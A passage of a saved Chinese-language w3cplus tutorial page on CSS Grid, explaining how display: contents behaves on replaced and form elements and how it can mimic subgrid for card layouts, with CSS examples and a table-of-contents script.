+  <p><strong>被替换的元素是指一些元素，比如<code>&lt;img&gt;</code>，其外观和盒子是由外部资源控制的。</strong></p>
+</blockquote>
+
+<p>从Web开发者角度来看，许多表单元素并不是由一个单一的”盒子“组成的，但对于浏览器引擎而言，它们是由几个较小的元素组成的。与被替换元素相似，删除盒子也没有意义，因为并没有一个盒子。因此，对于像 <code>&lt;select&gt;</code>、<code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code> 这些表单元素，<code>display:contents</code> 和 <code>dispaly: none</code>一样。</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：16-subgrid-vs-display：contents_files/RwgoONW(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/RwgoONW">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>正如示例所示，<code>&lt;button&gt;</code> 、<code>&lt;summary&gt;</code> 和 <code>&lt;fieldset&gt;</code>只移除视觉效果，内容还留着；而其他表单元素表现和<code>display:none</code>一样：</p>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-386.jpg" alt=""></p>
+
+<p>对于链接 <code>&lt;a&gt;</code> 来说，有点类似于 <code>&lt;button&gt;</code> 元素，元素周围的盒子被视觉化地移除，留下链接的内容。由于属性通常不受这个 CSS 规则的影响，链接仍然可以正常工作，并且可以像正常一样用来导航。</p>
+
+<p>在 HTML中，<code>&lt;br&gt;</code>、<code>&lt;wbr&gt;</code>、<code>&lt;meter&gt;</code>、<code>&lt;progress&gt;</code>、<code>&lt;canvas&gt;</code>、<code>&lt;embed&gt;</code>、<code>&lt;object&gt;</code>、<code>&lt;audio&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;video&gt;</code>、<code>&lt;frame&gt;</code>、<code>&lt;frameset&gt;</code>、<code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code> 和 <code>&lt;select&gt;</code> 等元素设置为 <code>display: contents</code> 时和 <code>display: none</code> 相同。</p>
+
+<p>HTML 中的 <code>&lt;legend&gt;</code> 不是一个已渲染的图例，因此，是否设置<code>display: contents</code>，它的表现都是正常的。</p>
+
+<p><code>&lt;button&gt;</code>、<code>&lt;details&gt;</code> 和 <code>&lt;fieldset&gt;</code> 这些元素没有任何特殊的行为，设置<code>display</code>为<code>contents</code>只是移除它们的主框（视觉框），而它的内容则正常表现。</p>
+
+<p>其他 HTML 元素的<code>display: contents</code>表现都很正常。</p>
+
+<p>除此之外，<code>&lt;svg&gt;</code>元素，<code>display: contents</code> 会被计算为 <code>display: none</code>；<code>&lt;use&gt;</code>元素使用<code>display:contents</code>时，会将该元素从格式化树中剥离，并将共内容提升到显示位置。还要注意的是，任何其他 SVG 元素，<code>display: contents</code> 都会计算成 <code>display: none</code>。</p>
+
+<h2 class="content-title" data-index="2">使用display: contents 模拟subgrid布局</h2>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-387.jpg" alt=""></p>
+
+<p>上图的效果，可以使用 嵌套网格 和 <code>subgrid</code> 来实现：</p>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-388.jpg" alt=""></p>
+
+<p>每张卡片都有一个”标题“，”缩略图“和”描述文本“三个部分组成：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">h2</span></span>&gt;</span></span>Standard card<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">h2</span></span>&gt;</span></span> <span class="comment"><span class="comment">&lt;!-- ① 标题 --&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">img</span></span> <span class="attribute"><span class="attribute">src</span></span>=<span class="value"><span class="value">"https://picsum.photos/400?random=1"</span></span> <span class="attribute"><span class="attribute">alt</span></span>=<span class="value"><span class="value">""</span></span> /&gt;</span></span> <span class="comment"><span class="comment">&lt;!-- ② 缩略图 --&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">p</span></span>&gt;</span></span>Pastry ...<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">p</span></span>&gt;</span></span> <span class="comment"><span class="comment">&lt;!-- ③ 描述文本 --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+</code></pre>
+
+<p>把很多个<code>div.card</code>放在一个网格容器中，比如：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__container"</span></span>&gt;</span></span> <span class="comment"><span class="comment">&lt;!-- 网格容器 --&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card"</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">h2</span></span>&gt;</span></span>Standard card<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">h2</span></span>&gt;</span></span> <span class="comment"><span class="comment">&lt;!-- ① 标题 --&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">img</span></span> <span class="attribute"><span class="attribute">src</span></span>=<span class="value"><span class="value">"https://picsum.photos/400?random=1"</span></span> <span class="attribute"><span class="attribute">alt</span></span>=<span class="value"><span class="value">""</span></span> /&gt;</span></span> <span class="comment"><span class="comment">&lt;!-- ② 缩略图 --&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">p</span></span>&gt;</span></span>Pastry ...<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">p</span></span>&gt;</span></span> <span class="comment"><span class="comment">&lt;!-- ③ 描述文本 --&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+</code></pre>
+
+<p>CSS 网格布局最大的优势之一就是 <strong>网格项目可以根据网格线编号放置任意想放置的位置</strong>。可以尽可能避免使用一些 HTML 标签元素。而 <code>display: contents</code> 的作用之一就是可以移除它所应用的元素的框。也就是说，如果你有一个为语义而非视觉目的而所需的元素，并且希望它的子元素参与到网格或Flexbox布局中，就很有用。</p>
+
+<p>就上图卡片的效果，就可以使用<code>display: contents</code> 来实现，即 <strong>模拟<code>subgrid</code>布局效果</strong>。在开始介绍<code>display: contents</code>模拟<code>subgrid</code>布局之前，先来回忆前面的 <strong>嵌套网格</strong> 和 *<strong><code>subgrid</code></strong>。</p>
+
+<p>使用嵌套网格。首先会在网格容器上定义列网格轨道：</p>
+
+<pre class="css"><code class="css"><span class="tag"><span class="tag">body</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(auto-fit, minmax(min(<span class="number"><span class="number">100</span></span>%, <span class="number"><span class="number">300</span></span>px)</span></span>, <span class="number"><span class="number">1</span></span>fr));</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-389.jpg" alt=""></p>
+
+<p>每个<code>div.card</code>就是一个嵌套网格（子网格），这个网格是一个 <code>1 x 3</code>（一列三行）：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.card</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">70</span></span>px min-content auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>这样一来，每个<code>.card</code>都创建了一个独立的网格：</p>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-390.jpg" alt=""></p>
+
+<p>在 CSS 网格系统中，嵌套网格中的两个网格（即父网格和子网格是两个独立的网格），子网格不会继承父网格任何参数，比如网格轨道，网格线，网格沟槽等：</p>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-391.jpg" alt=""></p>
+
+<p>嵌套网格有明显的布局缺陷，那就是子网格的轨道尺寸变化时，父网格无法自动感知到，比如上面示例，我们在标题所在行轨道（第一行行轨道）定死了高度为<code>70px</code>，如果标题内容高度大于预置的<code>70px</code>时，会打破整个网格布局，内容会溢出：</p>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-392.jpg" alt=""></p>
+
+<p>效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：16-subgrid-vs-display：contents_files/XWgNLwB(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/XWgNLwB">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p><code>subgrid</code>的出现，让事情变得更简单了。子网格上的<code>grid-template-rows</code>和<code>grid-template-columns</code>可以设置<code>subgrid</code>值。这样一来，子网格可以继承父网格轨道尺寸、网格线和网格沟槽等。并且，子网格的网格轨道尺寸改变可以直接调整其父网格。上面的示例，我们使用<code>subgrid</code>可以这样来实现：</p>
+
+<pre class="css"><code class="css"><span class="tag"><span class="tag">body</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(auto-fit, minmax(min(<span class="number"><span class="number">100</span></span>%, <span class="number"><span class="number">300</span></span>px)</span></span>, <span class="number"><span class="number">1</span></span>fr));</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>  
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-393.jpg" alt=""></p>
+
+<p>整个效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="subgrid" src="./Grid布局：16-subgrid-vs-display：contents_files/jOwMMzJ(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/jOwMMzJ">
+  subgrid</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>我们再来看 <code>display: contents</code> 模拟 <code>subgrid</code> 的网格布局效果。众所周知，带有<code>display</code>为<code>grid</code>（或 <code>inline-grid</code>）的元素被称为网格容器，其子元素被称为网格项目：</p>
+
+<pre class="css"><code class="css"><span class="tag"><span class="tag">body</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(auto-fit, minmax(min(<span class="number"><span class="number">100</span></span>%, <span class="number"><span class="number">300</span></span>px)</span></span>, <span class="number"><span class="number">1</span></span>fr));</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-394.jpg" alt=""></p>
+
+<p>如果我们在<code>.card</code> 显式设置<code>display: contents</code>时，那么 <code>div.card</code> 就不再是网格项目了，而<code>.card</code>容器的所有子元素就变成网格项目了：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.card</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> contents;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-grid-395.jpg" alt=""></p>
+
+<p>如此一来，就需要对每个<code>.card</code>的子元素，显式使用 <code>grid-row</code>、<code>grid-column</code> 或 <code>grid-area</code> 来放置网格项目，比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="tag"><span class="tag">h2</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="tag"><span class="tag">img</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="tag"><span class="tag">p</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="tag"><span class="tag">h2</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="tag"><span class="tag">img</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="tag"><span class="tag">p</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="tag"><span class="tag">h2</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="tag"><span class="tag">img</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="tag"><span class="tag">p</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">3</span></span> / <span class="number"><span class="number">4</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：16-subgrid-vs-display：contents_files/MWobNVZ(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/MWobNVZ">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>可以看得出来，虽然效果上看上去模拟出<code>subgrid</code>的效果。你也可能发现其中的缺陷了，卡片越多，我们需要的代码就会越多。除此之外，<code>display: contents</code> 模拟的<code>subgrid</code>效果是不具任何响应式的效果。比如上面的示例，屏幕尺寸调整之后，整个布局的缺陷就展现出来了：</p>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2109/css-grid-396.jpg">
+    <source src="/sites/default/files/blogs/2021/2109/css-grid-396.mp4" type="video/mp4">
+</video>
+</div>
+
+<p>正如上面示例所示，有了 <code>display: contents</code>，你可以把网格容器的孙子元素放在网格上。这允许更多的语义标签，这对Web可访问性是有益的。你的标记越有语义，屏幕阅读器这样的辅助技术能为用户提供更多的细节。然而，有一个注意事项，目前支持<code>display: contents</code> 的浏览器都没有将具有该属性的元素暴露在无障碍树上，并保留其原有角色。</p>
+
+<p>虽然，<code>display: contents</code> 能模拟出 <code>subgrid</code> 的效果，但并不代表着<code>display: contents</code>就能和<code>subgrid</code>一样。如果不考虑代码的冗余，不考虑其响应式的能力，在<code>subgrid</code>还未得到更多浏览器支持的时候，可以考虑用其来模拟。但个人并不建议任何情景之下都采用<code>display: contents</code> 来模拟<code>subgrid</code>。</p>
+</div></div></div>  </div>
+
+  
+   
+    <div id="node_footer" class="clearfix">
+              <div class="previous-next"><span class="prev">上一篇: </span><a href="https://www.w3cplus.com/css/grid-layout-part-15.html" target="_blank">图解CSS: Grid布局（Part15）</a> | <span class="next">下一篇: </span><a href="https://www.w3cplus.com/css/grid-layout-part-17.html" target="_blank">图解CSS: Grid布局（Part17）</a></div>            
+    </div>
+
+        
+
+</div>  </div>
+</div>
+  </div>
+
+        </div>
+
+      </div>
+    </div>
+
+    
+          <div id="sidebar-second" class="col-extra" style="position: sticky; top: 80px;">
+        <!-- <script type="text/javascript">document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E%3Cscript charset="utf-8" src="//rp.baidu.com/rp3w/3w.js?sid=10994702955876242907') + '&t=' + (Math.ceil(new Date()/3600000)) + unescape('"%3E%3C/script%3E'));</script> -->
+          <div class="region region-sidebar-second">
+    <div id="block-custom-search-blocks-1" class="block block-custom-search-blocks">
+
+    
+  <div class="content">
+    <form class="search-form" role="search" action="https://www.w3cplus.com/css/grid-layout-part-16.html?expire=1699867080&amp;code=NshCsF8EZQ4&amp;sign=b6d07d4086672d0a1ed20eaf7b393b1c" method="post" id="custom-search-blocks-form-1" accept-charset="UTF-8" target="_self"><div><div class="form-item form-type-textfield form-item-custom-search-blocks-form-1">
+  <label class="element-invisible" for="edit-custom-search-blocks-form-1--2">Search this site </label>
+ <input title="请输入您想搜索的关键词。" class="custom-search-box form-text" placeholder="" type="text" id="edit-custom-search-blocks-form-1--2" name="custom_search_blocks_form_1" value="" size="15" maxlength="128">
+</div>
+<input type="hidden" name="delta" value="1">
+<input type="hidden" name="form_build_id" value="form-bIisKDa4bGd39hz1VqeNMtGpSe4gmz_u_670k_7bjmM">
+<input type="hidden" name="form_id" value="custom_search_blocks_form_1">
+<div class="form-actions form-wrapper" id="edit-actions"><input type="submit" id="edit-submit" name="op" value="搜索" class="form-submit"></div></div></form>  </div>
+</div>
+<div id="block-block-53" class="block block-block">
+
+    <h2>直达目的地(^_^)</h2>
+  
+  <div class="content">
+    <div class="node-blog-title"><div class="atalog"><ul class="mb-2"> <li><a data-index="0" href="javascript:;" class="active">display: contents</a></li><li> <ul class="mb-2"><li><a data-index="1" href="javascript:;">display: contents 是什么？</a></li><li><a data-index="2" href="javascript:;">使用 display: contents 时会发生什么</a></li><li><a data-index="3" href="javascript:;">display:contents 边缘情况和特殊行为</a></li></ul></li><li><a data-index="4" href="javascript:;">使用display: contents 模拟subgrid布局</a></li></ul></div></div>
+
+<script>
+$('.node-blog h2').addClass('content-title');
+$('.node-blog h3').addClass('content-title');
+$('.node-blog h4').addClass('content-title');
+$('.node-blog h5').addClass('content-title');
+//  给 h2 到 h5 增加一个 data-index 的自定义属性
+$('.node-blog h2').attr('data-index', 2);
+$('.node-blog h3').attr('data-index', 3);
+$('.node-blog h4').attr('data-index', 4);
+$('.node-blog h5').attr('data-index', 5);
+
+//  函数的一个参数是标题级别，第二个参数是第一个标题的索引值
+function atalog(titleIndex, start) {
+    //  存储 HTML 和当前的索引值
+    var el = {
+        el: '',
+        index: start
+    };
+    var current = 0;  //  已遍历的数量
+
+    for (var i = start;i < $('.content-title').length;i ++) {
+        if (i < current) {
+            //  如果当前 i 的值小于已遍历的数量就跳过
+            continue;
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') > titleIndex) {
+            //  如果是更小一级的标题就调用自身继续查找
+            var result = atalog($('.content-title').eq(i).attr('data-index'), i);
+            //  把返回的 HTML 添加到当前函数的 el 中
+            el.el += '<li> ' + result.el + '</li>';
+            current = result.index + 1;  //  设置已遍历的数量
+            el.index = result.index;  //  设置索引
+            continue;  //  跳过本次循环
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') < titleIndex) {
+            //  如果是更大一级的标题就返回已生成的 HTML 目录
+            el.el = '<ul class="mb-2">' + el.el + '</ul>';
+            return el;
+        }
+        //  生成 HTML 目录
+        el.el += '<li><a data-index="' + i + '" href="javascript:;">' + $('.content-title').eq(i).text() + '</a></li>';
+        el.index = i;  //  设置当前的索引值为 i
+    }
+    //  添加列表的外层 ul
+    el.el = '<ul class="mb-2"> ' + el.el + '</ul>';
+    return el;  //  返回生成的 HTML 目录
+}
+
+//  调用生成目录的函数，从第 0 个 h2 开始
+var el = atalog(2, 0);
+//  把生成的目录插入到文章的开头
+$('.node-blog-title').prepend('<div class="atalog">' + el.el + '</div>');
+$(".node-blog-title .atalog > ul > li >a ").eq(0).addClass('active');
+//  给生成的目录添加点击事件
+$('.node-blog-title .atalog a').on('click', function () {
+    //  设置滚动条的高度为标题的 offsetTop
+     var topPos = $('.content-title').eq($(this).attr('data-index')).offset().top;
+var position = topPos - 80;
+    $(document).scrollTop(position);
+$('.node-blog-title .atalog a').removeClass('active')
+    $(this).toggleClass('active')
+});
+
+
+</script>
+
+  </div>
+</div>
+<div id="block-block-49" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-1.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/DEHQUMj/" target="_blank" title="防御式 CSS 精讲"><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-3.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrwMDDU/" target="_blank" title="现代 Web 布局"><img src="./Grid布局：16-subgrid-vs-display：contents_files/css-2.jpg" border="0" alt="" width="300"></a></div>
+
+
+  </div>
+</div>
+  </div>
+      </div>
+    
+
+  </div>
+</div>
+
+  <div id="footer-col" class="footer-col">
+    <div class="container">
+        <div class="region region-footer-col">
+    <div id="block-block-39" class="block block-block">
+
+    <h2>关于我们</h2>
+  
+  <div class="content">
+    <a class="media-object" href="http://www.w3cplus.com/">W3cplus</a>
+<div class="media-body">
+	<p>W3cplus是一个致力于推广国内前端行业的技术博客。它以探索为己任，不断活跃在行业技术最前沿，努力提供高质量前端技术博文；其文章范围广泛，主要以CSS、HTML、JavaScript、A11Y、动画等教程为主。</p>
+</div>
+  </div>
+</div>
+<div id="block-block-40" class="block block-block">
+
+    <h2>关于站长</h2>
+  
+  <div class="content">
+    <p><a class="media-object" href="https://www.w3cplus.com/" target="_blank">大漠</a></p>
+<div class="media-body">
+	<p>常用昵称“大漠”，<a href="https://www.w3cplus.com/" target="_blank">W3CPlus</a>创始人，曾就职于淘宝。对HTML、CSS和A11Y等领域有一定的认识和丰富的实践经验。现在主要从事智能UI领域的探讨和学习！。CSS和Drupal中国布道者。2014年出版《<a href="https://www.w3cplus.com/book-comment.html">图解CSS3：核心技术与案例实战</a>》。</p>
+	<div class="social">
+		<a rel="nofollow" class="github" href="https://github.com/airen" target="_blank" title="github">github</a> <a rel="nofollow" class="twitter" href="https://twitter.com/w3cplus" target="_blank" title="twitter">twitter</a></div>
+</div>
+<p>&nbsp;</p>
+  </div>
+</div>
+<div id="block-block-41" class="block block-block">
+
+    <h2>我的作品</h2>
+  
+  <div class="content">
+    <a class="media-object" href="https://www.w3cplus.com/book-comment.html" target="_blank">图解CSS3</a>
+<div class="media-body">
+	<p>本书是历时2载的心血之作，根据最新的CSS撰写，融入了作者在CSS领域多年的使用经验，旨在将本书打造成为CSS领域最权威和实用的专业著作，供没有经验的读者系统学习，供有经验的读者参考备查。新版在《<a href="https://www.w3cplus.com/blog/tags/674.html">图解SS</a>》中持续更新！</p></div>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+  <div id="footer" class="footer">
+    <div class="container">
+        <div class="region region-footer">
+    <div id="block-block-54" class="block block-block">
+
+    
+  <div class="content">
